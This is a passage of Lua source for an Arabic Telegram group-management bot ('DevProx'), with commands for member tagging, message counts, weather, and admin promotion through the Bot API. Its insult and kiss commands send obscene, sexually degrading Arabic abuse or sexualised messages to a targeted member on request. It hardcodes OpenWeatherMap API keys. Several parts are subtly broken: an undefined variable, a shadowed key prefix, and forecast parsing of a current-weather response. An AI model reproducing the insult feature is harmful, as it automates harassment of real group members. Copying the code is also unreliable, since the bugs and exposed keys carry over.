if text:match("^كلهم (.*)$")  then
local txt = {string.match(text, "^(كلهم) (.*)$")}
function tall(A1, A2)
local text = "🏆┇ "..txt[2].." \n~~~~~~~~~~~~~~~~~~~~\n"
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
i = 0
for k, v in pairs(A2.members_) do
i = i + 1
local user_info = DevAbs:hgetall('user:'..v.user_id_)  
if user_info and user_info.username then
local username = user_info.username
text = text.."<b> "..i.." ┇</b> { @"..username.." }\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
end
if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") or text:match("^يا سورس$") then 
local text =  [[
  📤┇ مرحبا بك في سورس ديف بروكس
  🏆┇ DevProx SOURCE  𝆺𝅥𝅯
  ➖➖➖➖➖➖➖➖➖➖
  ➖➖➖➖➖➖➖➖➖➖
  🏷┇ [مطور السورس ](t.me/IQ_ABS)
  🚸┇ [تواصل المحظورين ](t.me/IQA_bor)
  🔊┇ [قناة السورس ](t.me/DEV_PROX)
  🏆┇ [اضغط هنا لتنصيب السورس ](https://t.me/Dev_Prox)
  ➖➖➖➖➖➖➖➖➖➖
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--------DevProx
if text:match("^[Gg][Rr][Oo][Uu][Pp][Ss]$") and is_admin(msg.sender_user_id_, msg.chat_id_) or text:match("^الكروبات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local DevProx = DevAbs:scard(DevProx.."bot:groups")
local abs = DevAbs:scard("DevProx:addg"..bot_id) or 0
local users = DevAbs:scard(DevProx.."bot:userss")
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ *Groups :*  '..gps..'', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '*⏱┇ اعضاء الخاص { '..users..' }\n📤┇ عدد كروبات { '..DevProx..' }\n🎖┇ الكروبات المفعله { '..abs..' }\n⚜┇ الغير مفعله {'..(DevProx - abs)..'} *', 1, 'md')
end
end  
if  text:match("^[Mm]sg$") or text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  then
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local DevProx = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local DevProxy = (DevAbs:get('DevProx:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ welcome my dear \n📬┇ you have {*"..(user_msgs + DevProxy).." }* msg \n📖┇ in group ", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ اهلا وسهلا عزيزي \n📬┇ رسائلك الحقيقيه {*"..user_msgs.." }* \n📬┇ رسائلك المضافه {*"..DevProxy.." }* \n📬┇ رسائلك اليوم *{"..(DevProx).."} *\n📬┇ مجموع رسائلك {*"..(user_msgs + DevProxy).." }* \n📖┇ في المجموعه ", 1, 'md')
end
end
if text:match("^[Gg]p id$") or text:match("^ايدي المجموعه$") then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = "??┇ Group ID ~ "..msg.chat_id_
else
texts = "📤┇ ايدي المجموعه ~ "..msg.chat_id_
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
-------------------------------------DevProx----------------------------------------------------------
if text:match("^ايديي$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'. اهلا بك عزيزي  '..renk_DevProx(msg)..' \n . ايديك هو `'..msg.sender_user_id_..'`', 1, 'md') 
end
----------DevProx
if text:match("^[Mm]y username$") or text:match("^معرفي$")  then
function get_username(extra,result,success)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ Your Username ~ {User}'
else
text = '📤┇ معرفك ~ {User}'
end
local text = text:gsub('{User}',('@'..result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
-------------------------------------DevProx----------------------------------------------------------
if text:match("^[Mm]y name$") or text:match("^اسمي$") then
function get_firstname(extra,result,success)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ your name ~ {firstname}'
else
text = '📤┇ اسمك ~ {firstname}'
end
local text = text:gsub('{firstname}',(result.first_name_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
-------DevProx
if text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده العضو 🚸'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
--------------DevProx
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then
 
local text =  [[
📤┇ رابط حذف التلي 
🎖┇ براحتك هو انت تطرب ع الحذف 
📖┇ [ اضغط هنا لحذف الحساب ](https://telegram.org/deactivate) 
🎁┇ [ اضغط هنا لديك مفاجئه ](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^جهاتي$") then
add = (tonumber(DevAbs:get(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ عدد الجهات الي ضفتها  *{"..add.."}*", 1, 'md')
end
if text:match("^رسائلي اليوم$") then 
local DevProx = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
Dev_Abs(msg.chat_id_, msg.id_, 1, "📬┇ رسائلك اليوم *{"..(DevProx).."} *", 1, 'md')
end
------------------DevProx
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") then
  MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
  Ptrn = MatchesEN[2] or MatchesFA[2]
  local function temps(K)
   local F = (K*1.8)-459.67
   local C = K-273.15
   return F,C
  end
  
  local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
  local jtab = JSON:decode(res)
  if jtab.name then
   if jtab.weather[1].main == "Thunderstorm" then
    status = "⛈ عاصف"
   elseif jtab.weather[1].main == "Drizzle" then
    status = "🌦 امطار خفيفه"
   elseif jtab.weather[1].main == "Rain" then
    status = "🌧 مطر شديد"
   elseif jtab.weather[1].main == "Snow" then
    status = "🌨 مثلج"
   elseif jtab.weather[1].main == "Atmosphere" then
    status = "🌫 مغبر"
   elseif jtab.weather[1].main == "Clear" then
    status = "🌤️ صاف"
   elseif jtab.weather[1].main == "Clouds" then
    status = "☁️ غائم"
   elseif jtab.weather[1].main == "Extreme" then
     status = "-------"
   elseif jtab.weather[1].main == "Additional" then
    status = "-------"
   else
    status = "-------"
   end
   local A1,C1 = temps(jtab.main.temp)
   local A2,C2 = temps(jtab.main.temp_min)
   local F3,C3 = temps(jtab.main.temp_max)
   if jtab.rain then
    rain = jtab.rain["3h"].." ميليمتر"
   else
    rain = "-----"
   end
   if jtab.snow then
    snow = jtab.snow["3h"].." ميليمتر"
   else
    snow = "-----"
   end
   day = 313456502
   today = "• اسم المدينه : *"..jtab.name.."*\n"
   .."• اسم الدوله : *"..(jtab.sys.country or "----").."*\n"
   .."• درجه الحراره :\n"
   .."   "..C1.."° سلليزي\n"
   .."   "..A1.."° فهرنهايت\n"
   .."   "..jtab.main.temp.."° كلفن\n"
   .."• الجو "..status.." تقريبا\n\n"
   .."• درجه حراره اليوم الصغرى : C"..C2.."°   F"..A2.."°   K"..jtab.main.temp_min.."°\n"
   .."• درجه حراره اليوم الكبرى : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
   .."• رطوبة الهواء : "..jtab.main.humidity.."%\n"
   .."• كثافه الغيوم : "..jtab.clouds.all.."%\n"
   .."• سرعه الرياح : "..(jtab.wind.speed or "------").." متر / ثانيه\n"
   .."• اتجاه الرياح : "..(jtab.wind.deg or "------").."° درجه\n"
   .."• تقلب الرياح : "..(jtab.main.pressure/1000).."\n"
   .."• اخر 3 ساعات من المطر : "..rain.."\n"
   .."• اخر 3 ساعات من تساقط الثلوج : "..snow.."\n\n"
   after = ""
   local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=de8f6f3e0b7f8a36a3e05f47418643bf")
   local jtab = JSON:decode(res)
   for i=1,5 do
    local A1,C1 = temps(jtab.list[i].main.temp_min)
    local A2,C2 = temps(jtab.list[i].main.temp_max)
    if jtab.list[i].weather[1].main == "Thunderstorm" then
     status = "⛈ عاصف"
    elseif jtab.list[i].weather[1].main == "Drizzle" then
     status = "🌦 امطار خفيفه"
    elseif jtab.list[i].weather[1].main == "Rain" then
     status = "🌧 مطر شديد"
    elseif jtab.list[i].weather[1].main == "Snow" then
     status = "🌨 مثلج"
    elseif jtab.list[i].weather[1].main == "Atmosphere" then
     status = "🌫 مغبر"
    elseif jtab.list[i].weather[1].main == "Clear" then
     status = "🌤️صاف"
    elseif jtab.list[i].weather[1].main == "Clouds" then
     status = "☁️ غائم"
    elseif jtab.list[i].weather[1].main == "Extreme" then
     status = "-------"
    elseif jtab.list[i].weather[1].main == "Additional" then
     status = "-------"
    else
     status = "-------"
    end
    if i == 1 then
     day = "• طقس يوم غد"
    elseif i == 2 then
     day = "• طقس بعد غد"
    elseif i == 3 then
     day = "• طقس بعد 3 ايام"
    elseif i == 4 then
     day = "• طقس بعد 4 ايام"
    elseif i == 5 then
      day = "• طقس بعد 5 ايام"
    end
    after = after.."- "..day..status.."تقريبا \n🔺C"..C2.."°  *-*  F"..A2.."°\n🔻C"..C1.."°  *-*  F"..A1.."°\n"
   end
   Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
   Dev_Abs(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  else
   Text  = "• لا توجد مدينه بهذا الاسم 🌐"
   Dev_Abs(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
  end
 end
---------------DevProx
if (msg.sender_user_id_) then
local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
if text:match("^[Nn]erkh$") or text:match("^المطور$") then
local nerkh = DevAbs:get(DevProx.."nerkh")
if nerkh then
Dev_Abs(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
elseif DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ Bot not found ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ لم يتم وضع كليشه المطور ", 1, "md")
end
end 
end 
---------------DevProx
if text and text:match('^هينه @(.*)')  then 
local username = text:match('^هينه @(.*)') 
function DevProx(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'يول شو تمسلت اكو واحد يهين نفسه ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو انت تمضرط تريد اهين تاج راسي مثلا ?', 1, 'md') 
return false  
end  
local DevProx = { "لك حيوان @"..username.." 100 نعال اسوكك بس تحجي فهمت ","لك فرخ @"..username.." اكل خره لا رجعك منين ما طلعت  ","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه ","فرخ دودكي  @"..username.." صير ادمي لا حطك بركبتي ",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..DevProx[math.random(#DevProx)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚸*¦*  العضو لا يوجد في المجموعه ', 1, 'md') 
end 
end 
resolve_username(username,DevProx)
end
------------------DevProx
if text:match("^هينه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, ' شكد غبي لعد 🌚?? تريدني اهين نفسي ؟ دكسمك 😌😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, ' دي لك تريد اهين تاج راسك ؟ 🌚', 1, 'md')
return false
end 
local DevProx = " صار ستاذي 😌" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md') 
local DevProx = {" ها لك جرجف اليوم اكتلك واخري ع كبرك 😈"," حضينه مستنقع الجبات صير عاقل لا اهفك بالنعال 😒"," قاروره جاروره بلاع العيوره لا تندك باسيادك 😒"," خاب دي لا احط بكسمك الديفدي واركعك بعير ثري دي  فرخي ابن جبتي 😒"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..DevProx[math.random(#DevProx)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, ' حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, ' اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
return false
end 
local DevProx = " صار ستاذي راح اتماصص وياه 🙊😻" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md') 
local DevProx = {" تعالي حياتي خل نتماصص 😻👏"," اممممووووواااااح لصق الشفه 😻"," امح امح امح امح بوسه لو عسل 😼😻"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..DevProx[math.random(#DevProx)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, ' حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, ' اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
return false
end 
local DevProx = " صار ستاذي راح اتماصص وياه 🙊😻" 
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md') 
local DevProx = {" تعالي حياتي خل نتماصص 😻👏"," اممممووووواااااح لصق الشفه 😻"," امح امح امح امح بوسه لو عسل 😼😻"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..DevProx[math.random(#DevProx)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^رفع ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن بالكروب ) *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *ادمن الكروب* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله ( عضو ) *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن بالكروب بكل الصلاحيات )\n🏆┇ صلاحياته الان \n☑️┇ تغيير اسم المجموعه \n☑️┇ حذف الرسائل \n☑️┇ الدعوه بالرابط \n☑️┇ تثبيت الرسائل \n☑️┇ اضافه مشرفين *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم الغاء ( خاصيه تغيير الاسم )\n🏆┇ صلاحياته الان \n☑️┇ حذف الرسائل \n☑️┇ الدعوه بالرابط \n☑️┇ تثبيت الرسائل *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم الغاء ( خاصيه التثبيت )\n🏆┇ صلاحياته الان \n☑️┇ حذف الرسائل \n☑️┇ الدعوه بالرابط *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
------------------------------------------DevProx-----------------------------------------------------
local text = msg.content_.text_:gsub('رفع ادمن','Promote')
if text:match("^[Pp]romote$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:momod:'..msg.chat_id_
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now a moderator ✅ \nֆ                 ֆ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن ) سابقا*', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been promote ✅ \nֆ                 ֆ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن ) بنجاح*', 1, 'md')
end
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
-----------------------------------------DevProx------------------------------------------------------
if text:match("^[Pp]romote @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, "^([Pp]romote) @(.*)$")}
function promote_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ promoted to moderator ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن ) بنجاح*'
end
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promote_by_username)
end
-------------------------------------DevProx----------------------------------------------------------
if text:match("^[Pp]romote (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, "^([Pp]romote) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been promote ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( ادمن ) بنجاح*', 1, 'md')
end
end
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_, ap[2])
end
-----------------------------------------DevProx------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل ادمن','Demote')
if text:match("^[Dd]emote$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
function demote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:momod:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🌟┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not promote ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم رفعه ( ادمن ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ was removed from promoted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *الادمن* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه الادمنيه )*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
-------------------------------------------DevProx----------------------------------------------------
if text:match("^تنزيل ادمن @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local abs = 'bot:momod:'..msg.chat_id_
local ap = {string.match(text, "^(تنزيل ادمن) @(.*)$")}
function demote_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ was demoted ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ *الادمن* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه الادمنيه )*'
end
DevAbs:srem(DevProx..abs, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demote_by_username)
end
------------------------------------------DevProx-----------------------------------------------------
if text:match("^[Dd]emote (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local abs = 'bot:momod:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emote) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..ap[2]..' ، 🚷\n🚸┇ was demoted ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *الادمن* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله من ( قائمه الادمنيه )*', 1, 'md')
end
end
DevAbs:srem(DevProx..abs, ap[2])
end
-----------------------------------------DevProx------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
local text = msg.content_.text_:gsub('رفع مميز','Setvip')
if text:match("^[Ss]etvip$") and msg.reply_to_message_id_ ~= 0  then
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:VipGroup:'..msg.chat_id_
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
